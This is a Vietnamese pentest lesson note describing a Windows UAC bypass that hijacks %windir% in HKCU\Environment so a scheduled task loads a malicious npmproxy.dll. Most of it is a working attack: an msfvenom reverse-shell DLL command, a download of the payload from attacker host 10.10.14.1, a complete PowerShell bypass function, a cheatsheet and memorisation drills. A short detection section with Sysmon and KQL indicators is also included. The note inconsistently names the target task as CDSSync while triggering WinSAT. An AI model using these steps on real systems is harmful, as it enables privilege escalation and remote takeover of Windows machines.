---
title: "13. Environment Variable Hijack — %windir% / %systemroot%"
type: attack
tags: [pentest, windows, uac-bypass, env-var-hijack, windir, cdcsync, npmproxy, attack, lesson-13]
aliases: [windir UAC Bypass, Environment Variable UAC, CDSSync Bypass]
created: 2026-04-02
---

> **Prerequisites**: [[01-uac-internals|01. UAC Internals]] · [[02-auto-elevation-mechanism|02. Auto-Elevation Mechanism]]
> **Objectives**:
> - Hiểu tại sao `HKCU\Environment\windir` có thể override system-wide `%windir%`
> - Khai thác CDSSync scheduled task dùng `%windir%\System32` để load DLL
> - Thực hiện bypass với `npmproxy.dll` qua environment variable redirect
> - Nhận diện đây là technique duy nhất work với UAC Always Notify mà không cần race condition

---

## Điều kiện khai thác

> [!note] Điều kiện bắt buộc
> - User trong local Administrators group
> - **Hoạt động với UAC = Always Notify** (kể cả level cao nhất)
> - Windows 10 / 11 — CDSSync task phải tồn tại
> - Không cần drop bất kỳ file nào vào trusted path

> [!tip] Tại sao technique này đặc biệt?
> Đây là kỹ thuật **không dùng auto-elevation** — thay vào đó khai thác scheduled task đã cấu hình chạy với highest privilege, và redirect task đó load DLL từ attacker-controlled path thông qua environment variable. Không có UAC prompt nào có thể chặn điều này.

---

## Cơ chế tấn công

### HKCU\Environment — Per-User Environment Variables

Windows có hai nơi lưu environment variables:

```text
System-wide: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
Per-user:    HKCU\Environment
```

Khi process được spawn, Windows merge cả hai — và **HKCU\Environment override HKLM** cho cùng tên biến. Bất kỳ user nào cũng có thể write vào `HKCU\Environment` ở Medium Integrity.

Nếu attacker set `HKCU\Environment\windir = C:\Users\Public\Fake`, thì tất cả process được spawn **trong session đó** mà dùng `%windir%` sẽ thấy `C:\Users\Public\Fake` thay vì `C:\Windows`.

### CDSSync Scheduled Task — Target

```text
Task: \Microsoft\Windows\Maintenance\WinSAT (hoặc CDSSync tùy build)
Run As: Highest available privileges
Executable: %windir%\system32\taskhostw.exe
```

Khi task này chạy, `taskhostw.exe` được spawn từ `%windir%\system32\`. Nếu attacker kiểm soát `%windir%`, `taskhostw.exe` thực ra chạy từ `C:\Users\Public\Fake\system32\taskhostw.exe` — attacker-controlled binary.

Nhưng cách phổ biến hơn (và ít disruptive hơn): redirect `%windir%` để `taskhostw.exe` load **missing DLL** từ attacker path:

```text
taskhostw.exe → load npmproxy.dll từ %windir%\System32\
→ %windir% = C:\Users\Public\Fake
→ Tìm C:\Users\Public\Fake\System32\npmproxy.dll
→ Attacker đã đặt malicious npmproxy.dll ở đó!
```

### Luồng tấn công hoàn chỉnh

```text
Attacker (Medium Integrity)
    ↓ Tạo C:\Users\Public\windir_fake\System32\
    ↓ Copy npmproxy.dll (malicious) vào C:\Users\Public\windir_fake\System32\
    ↓ reg add HKCU\Environment /v windir /d "C:\Users\Public\windir_fake" /f
    ↓ Trigger CDSSync task (schtasks /run hoặc WMI)
        ↓ taskhostw.exe spawns với %windir% = C:\Users\Public\windir_fake
        ↓ Load npmproxy.dll từ C:\Users\Public\windir_fake\System32\
        ↓ npmproxy.dll = attacker's reverse shell DLL
→ Reverse shell chạy ở HIGH INTEGRITY — no UAC prompt, kể cả Always Notify
    ↓ Cleanup: reg delete HKCU\Environment /v windir /f
```

---

## Quy trình tấn công

**Môi trường giả định**: Medium Integrity shell, Windows 10, **UAC = Always Notify**.

### Bước 1 — Xác nhận UAC = Always Notify (test context)

```powershell
$key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
(Get-ItemProperty $key).ConsentPromptBehaviorAdmin
# Nếu = 2 → Always Notify → techniques khác fail → dùng technique này
```

### Bước 2 — Tạo fake windir structure

```powershell
# Tạo fake System32 directory
$fakeWinDir = "$env:USERPROFILE\AppData\Local\Temp\windir_fake"
$fakeSys32  = "$fakeWinDir\System32"
New-Item -ItemType Directory -Force -Path $fakeSys32 | Out-Null
Write-Output "[+] Created: $fakeSys32"
```

### Bước 3 — Tạo và đặt malicious npmproxy.dll

```bash
# Trên attacker machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 \
    -f dll -o npmproxy.dll
```

```powershell
# Upload và copy vào fake System32
Invoke-WebRequest -Uri "http://10.10.14.1/npmproxy.dll" -OutFile "$fakeSys32\npmproxy.dll"
Write-Output "[+] Payload placed at $fakeSys32\npmproxy.dll"
```

### Bước 4 — Set HKCU windir override

```powershell
# Override windir trong per-user environment
[System.Environment]::SetEnvironmentVariable("windir", $fakeWinDir, "User")
# Hoặc dùng reg:
# reg add "HKCU\Environment" /v windir /d "$fakeWinDir" /f
Write-Output "[+] windir overridden to: $fakeWinDir"
```

> [!warning] Impact quan trọng
> Sau khi set `windir` override, một số process trong session hiện tại có thể bị ảnh hưởng. Cleanup ngay sau khi bypass thành công.

### Bước 5 — Setup listener

```bash
nc -lvnp 4444
```

### Bước 6 — Trigger CDSSync task

```powershell
# Tìm tên chính xác của task
Get-ScheduledTask | Where-Object { $_.TaskName -match "CDSSync|WinSAT|Maintenance" } |
    Select-Object TaskPath, TaskName, State

# Trigger (tên có thể khác nhau tùy Windows build)
Start-ScheduledTask -TaskPath "\Microsoft\Windows\Maintenance\" -TaskName "WinSAT"
# Hoặc:
schtasks /run /tn "\Microsoft\Windows\Maintenance\WinSAT"
```

> **Expected output**: Callback nhận được trên listener. Shell chạy ở High Integrity.

### Bước 7 — Cleanup (QUAN TRỌNG — làm ngay)

```powershell
# Xóa windir override ngay lập tức
[System.Environment]::SetEnvironmentVariable("windir", $null, "User")
# Hoặc:
reg delete "HKCU\Environment" /v windir /f

# Xóa fake directory
Remove-Item -Recurse -Force $fakeWinDir -ErrorAction SilentlyContinue
Write-Output "[*] Cleaned up — windir restored"
```

### PowerShell function hoàn chỉnh

```powershell
function Invoke-WindirEnvBypass {
    param(
        [string]$LHost = "10.10.14.1",
        [int]$LPort    = 4444,
        [string]$TaskPath = "\Microsoft\Windows\Maintenance\",
        [string]$TaskName = "WinSAT"
    )

    $fakeWinDir = "$env:TEMP\windir_$(Get-Random)"
    $fakeSys32  = "$fakeWinDir\System32"
    $dllName    = "npmproxy.dll"

    try {
        # Create structure
        New-Item -ItemType Directory -Force -Path $fakeSys32 | Out-Null

        # Download payload
        $url = "http://${LHost}/npmproxy.dll"
        Invoke-WebRequest -Uri $url -OutFile "$fakeSys32\$dllName"
        Write-Output "[+] Payload: $fakeSys32\$dllName"

        # Override windir
        [System.Environment]::SetEnvironmentVariable("windir", $fakeWinDir, "User")
        Write-Output "[+] windir → $fakeWinDir"

        # Trigger task
        Start-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName
        Write-Output "[+] Task triggered — waiting for callback"
        Start-Sleep -Seconds 5

    } finally {
        # Always cleanup
        [System.Environment]::SetEnvironmentVariable("windir", $null, "User")
        Remove-Item -Recurse -Force $fakeWinDir -ErrorAction SilentlyContinue
        Write-Output "[*] windir restored, fake dir removed"
    }
}

# Usage
Invoke-WindirEnvBypass -LHost "10.10.14.1" -LPort 4444
```

---

## Biến thể & Bypass

### %systemroot% thay vì %windir%

Một số task dùng `%systemroot%` thay vì `%windir%`:

```powershell
[System.Environment]::SetEnvironmentVariable("systemroot", $fakeWinDir, "User")
# Trigger task, then cleanup
[System.Environment]::SetEnvironmentVariable("systemroot", $null, "User")
```

### byeintegrity5 — UAC-always-notify-capable PoC

GitHub PoC `byeintegrity5-uac` của `@AzAgarampur` implement technique này:

```powershell
# Clone và build
git clone https://github.com/AzAgarampur/byeintegrity5-uac
# Compile, sau đó:
.\byeintegrity5.exe "cmd.exe /c start cmd.exe"
```

### Khác biệt với SilentCleanup (Lesson 12)

| | SilentCleanup (L12) | Env Var Hijack (L13) |
|--|--|--|
| UAC Always Notify | Work | Work |
| Race condition cần? | Có (WMI monitor) | Không |
| Registry write? | Không | Có (HKCU\Environment) |
| Cleanup urgency | Bình thường | **Khẩn cấp** — windir ảnh hưởng toàn session |
| Reliability | Phụ thuộc timing | Cao hơn |

---

## Cây quyết định

```mermaid
flowchart TD
    A[UAC = Always Notify?] -->|Không| B[Dùng bất kỳ technique nào<br>Lessons 03-10]
    A -->|Có level 2| C{Scheduled task available?}
    C -->|CDSSync/WinSAT task disabled| D[SilentCleanup Lesson 12<br>hoặc tìm task khác dùng %windir%]
    C -->|Task available| E[Env Var Hijack — không cần race condition]
    E --> F[Tạo fake windir structure]
    F --> G[Place malicious npmproxy.dll]
    G --> H[Set HKCU Environment windir]
    H --> I[Trigger task]
    I --> J{Callback received?}
    J -->|Có| K[CLEANUP ngay: xóa windir override + fake dir]
    J -->|Không| L{Task tìm thấy?}
    L -->|Task không tồn tại| M[Tìm task khác dùng %windir%:\n Get-ScheduledTask | where Action -match windir]
    L -->|Task tồn tại| N[Kiểm tra DLL name — thử npmproxy.dll variants]
```

---

## Command Cheatsheet

**Setup fake directory**

```powershell
$fake = "$env:TEMP\w$(Get-Random)"
$sys32 = "$fake\System32"
New-Item -ItemType Directory -Force $sys32 | Out-Null
```

**Place payload DLL**

```bash
# Attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o npmproxy.dll
```

```powershell
# Target
Invoke-WebRequest "http://<IP>/npmproxy.dll" -OutFile "$sys32\npmproxy.dll"
```

**Override windir**

```powershell
[System.Environment]::SetEnvironmentVariable("windir", $fake, "User")
# CMD alternative:
# reg add "HKCU\Environment" /v windir /d "$fake" /f
```

**Trigger task**

```powershell
Start-ScheduledTask -TaskPath "\Microsoft\Windows\Maintenance\" -TaskName "WinSAT"
# Alternative:
schtasks /run /tn "\Microsoft\Windows\Maintenance\WinSAT"
```

**Cleanup (luôn làm ngay)**

```powershell
[System.Environment]::SetEnvironmentVariable("windir", $null, "User")
Remove-Item -Recurse -Force $fake
# CMD: reg delete "HKCU\Environment" /v windir /f
```

**Kiểm tra tasks dùng %windir%**

```powershell
Get-ScheduledTask | ForEach-Object {
    $actions = $_.Actions | Where-Object { $_.Execute -match "%windir%|%systemroot%" }
    if ($actions) { Write-Output "$($_.TaskPath)$($_.TaskName)" }
}
```

---

## Daily Drill

**Thời gian**: 15 phút/ngày trong 7 ngày.

**Drill 1 — 5 bước từ trí nhớ**
Mục tiêu: nhớ đúng thứ tự không bỏ sót cleanup.

```text
1. New-Item fake\System32
2. Copy npmproxy.dll vào fake\System32
3. SetEnvironmentVariable windir = fake
4. Start-ScheduledTask WinSAT
5. SetEnvironmentVariable windir = $null  ← KHÔNG ĐƯỢC QUÊN
```

Luyện cho đến khi: 5 bước in đúng thứ tự trong 10 giây.

**Drill 2 — Registry vs SetEnvironmentVariable**
Mục tiêu: biết cả hai cách set và xóa env var.

```powershell
# PowerShell
[System.Environment]::SetEnvironmentVariable("windir", $path, "User")  # set
[System.Environment]::SetEnvironmentVariable("windir", $null, "User")  # delete

# CMD
reg add "HKCU\Environment" /v windir /d "C:\fake" /f   # set
reg delete "HKCU\Environment" /v windir /f              # delete
```

**Drill 3 — Tên DLL target**
Luyện cho đến khi: nhớ `npmproxy.dll` ngay lập tức khi nghĩ đến windir hijack.

---

## Phát hiện & Phòng thủ

> [!warning] Detection Indicators
> **Registry**: Write đến `HKCU\Environment\windir` hoặc `HKCU\Environment\systemroot`
> - Sysmon Event ID 13: `TargetObject: *Environment\windir*` — **high confidence IOC**
> - Đây là indicator mạnh nhất và dễ detect nhất của technique này
>
> **Process**: `taskhostw.exe` load DLL từ non-System32 path
> - Sysmon Event ID 7: `ImageLoaded: *Users*npmproxy.dll*`
>
> **Changes to system-wide value**: `%windir%` bị set khác `C:\Windows` là extremely suspicious
> - KQL: `event.code: "13" AND registry.path: "*Environment\\windir*" AND NOT registry.data.strings: "C:\\Windows"`

> [!note] Mitigation
> - Monitor `HKCU\Environment\windir` write events — rất ít legitimate app làm điều này
> - Alert khi `%windir%` != `C:\Windows` trong process environment
> - WinSAT/CDSSync task: monitor DLL loads từ non-System32 paths

---

## Lab Thực hành

| Platform | Machine | Tại sao phù hợp |
|----------|---------|----------------|
| Local VM | Windows 10 UAC = Always Notify | Test khi standard techniques fail — xác nhận technique work |
| Local VM | Windows 10 + Sysmon | Quan sát Event ID 13 khi set windir |
| HTB | **Endgame XEN** (Retired) | Environment manipulation trong complex chain |
| Local VM | Windows 11 | Test với CDSSync/WinSAT tên task |

---

## Field Manual Entry

> [!abstract] %windir% Environment Variable Hijack
> **Điều kiện**: User trong Admins — **works với UAC Always Notify, không race condition**
> **IOC mạnh nhất**: Write HKCU\Environment\windir — monitor ngay
> **Quick flow**:
> ```powershell
> # 1. Fake dir
> $f="$env:TEMP\w$(Get-Random)"; md "$f\System32" | Out-Null
> # 2. Payload
> IWR "http://IP/npmproxy.dll" -OutFile "$f\System32\npmproxy.dll"
> # 3. Override
> [System.Environment]::SetEnvironmentVariable("windir",$f,"User")
> # 4. Trigger
> Start-ScheduledTask -TaskPath "\Microsoft\Windows\Maintenance\" -TaskName "WinSAT"
> Start-Sleep 5
> # 5. CLEANUP (urgent!)
> [System.Environment]::SetEnvironmentVariable("windir",$null,"User")
> Remove-Item -Recurse -Force $f
> ```
> **Ref**: [[13-env-var-hijack-windir|13. Environment Variable Hijack — %windir%]]
